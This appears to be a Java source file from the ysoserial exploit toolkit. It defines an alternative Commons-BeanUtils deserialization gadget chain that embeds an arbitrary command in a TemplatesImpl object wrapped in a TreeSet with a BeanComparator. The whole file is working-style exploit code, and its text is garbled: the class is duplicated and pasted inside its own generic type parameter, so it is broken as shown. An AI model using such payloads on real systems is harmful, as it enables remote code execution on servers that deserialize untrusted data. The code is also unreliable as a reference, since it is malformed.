package ysoserial.payloads;

import java.io.Serializable;
import java.util.TreeSet;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"frohoff"})
public class CommonsBeanutils1Alternative implements ObjectPayload<package ysoserial.payloads;

import java.io.Serializable;
import java.util.TreeSet;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"frohoff"})
public class CommonsBeanutils1Alternative implements ObjectPayload<Object> {

    public CommonsBeanutils1Alternative(String calc) {
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1Alternative.class, args);
    }

    @Override
    public Serializable getObject(String command) throws Exception {
        // 创建一个可以触发反序列化漏洞的 TemplatesImpl 对象
        Object templates = Gadgets.createTemplatesImpl(command);

        // 创建自定义的 BeanComparator，使用 TemplatesImpl 的方法作为比较依据
        BeanComparator comparator = new BeanComparator("outputProperties");

        // 使用 TreeSet 和自定义比较器
        TreeSet<Object> treeSet = new TreeSet<>(comparator);
        treeSet.add(templates);
        treeSet.add(templates);

        // 由于TreeSet是Serializable的，我们可以直接返回它
        return treeSet;
    }
}> {

    public CommonsBeanutils1Alternative() {
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1Alternative.class, args);
    }

    @Override
    public Serializable getObject(String command) throws Exception {
        // 创建一个可以触发反序列化漏洞的 TemplatesImpl 对象
        Object templates = Gadgets.createTemplatesImpl(command);

        // 创建自定义的 BeanComparator，使用 TemplatesImpl 的方法作为比较依据
        BeanComparator comparator = new BeanComparator("outputProperties");

        // 使用 TreeSet 和自定义比较器
        TreeSet<Object> treeSet = new TreeSet<>(comparator);
        treeSet.add(templates);
        treeSet.add(templates);

        // 由于TreeSet是Serializable的，我们可以直接返回它
        return treeSet;
    }
}
